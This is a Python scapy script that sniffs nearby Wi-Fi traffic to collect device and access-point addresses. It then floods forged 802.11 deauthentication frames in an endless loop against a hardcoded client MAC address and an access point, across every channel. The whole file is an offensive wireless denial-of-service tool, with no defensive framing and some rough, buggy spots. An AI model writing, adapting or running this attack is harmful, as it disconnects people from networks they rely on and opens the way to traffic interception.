import threading
import os, time 
import random 
from scapy.all import *

addresses = [] # transmitters 
AP = {} #Acces Points

channel = 1
ftime = 20

def send_msg(iface):
    # os.system('sudo airmon-ng stop %s' % (iface))
    # iface = iface[:-3]
    i=0
    print(len(AP), len(addresses))
    while addresses[i] in AP:
        i=random.randint(0,len(addresses))

    sender = addresses[i]
    # dot11 = Dot11(type=0,subtype=12, addr1='ff:ff:ff:ff:ff:ff',addr2=sender, addr3=sender)
    AC='ff:ff:ff:ff:ff:ff'
    for addr in addresses:
        if addr in AP:
            if AP[addr] == b'': #find good AccessPoint
                AC=addr

    while True:
        for n in range(1,14):
            for addr in addresses:
                if addr == 'ac:07:5f:06:43:c3':
                    
                    SSID = "Test"
                    dot11AP = Dot11(addr1=addr,addr2=AC, addr3=AC)
                    dot11client = Dot11(addr1=AC,addr2=addr, addr3=addr)
                    frameCLI = RadioTap()/dot11client/Dot11Deauth()
                    frameAP = RadioTap()/dot11AP/Dot11Deauth()
                    # not correct format I guess
                    print(f"channel: {n}, addr: {addr}")
                    os.system('iwconfig %s channel %d' % (iface, n))
                    
                    sendp(frameCLI, iface=iface)
                    sendp(frameAP, iface=iface)


def stopfilter(x):
    if stop_sniffer == True:
        return True


def sniffer_thread(interface):
    global stop_sniffer
    stop_sniffer = False
    sniff(iface=interface, prn=findSSID, stop_filter = stopfilter)

def findSSID(pkt):
    device=pkt.getlayer(Dot11)
    if device.addr2 not in addresses:
        addresses.append(device.addr2)
        if pkt.haslayer(Dot11Beacon):
            ssid = pkt.getlayer(Dot11Elt).info
            print(device.addr1,device.addr2,device.addr3,device.payload.name,ssid)
            AP[device.addr2] = ssid
        else:
            if device.addr1 in AP:
                print(AP[device.addr1],device.addr2,device.addr3,device.payload.name)
            else: 
                print(device.addr1,device.addr2,device.addr3,device.payload.name)

def hopper(interface):
    n = 1
    global stop_hopper
    stop_hopper = False
    while not stop_hopper:
        time.sleep(0.5)
        os.system('iwconfig %s channel %d' % (interface, n))
        # print(f"channel {n}")
        n = random.randint(1,13)
        channel = n
            
if __name__=="__main__":
    interface = 'wlp3s0'
    os.system('sudo airmon-ng start %s' % (interface))
    interface += 'mon'

    thread1 = threading.Thread(target=hopper, args=(interface, ), name="hopper")
    thread1.daemon = True
    thread1.start()

    thread2 = threading.Thread(target=sniffer_thread, args=(interface,), name="sniffer")
    thread2.daemon = True
    thread2.start()

    stime = time.time()
    ctime = 0
    while ctime < ftime:
        ctime = time.time()-stime
    print("stopping hopper")
    stop_hopper = True
    print("stopping sniffer")
    stop_sniffer = True
    thread1.join()
    print("hopper stopped")
    thread2.join()
    print("sniffer stopped")
    send_msg(interface)
    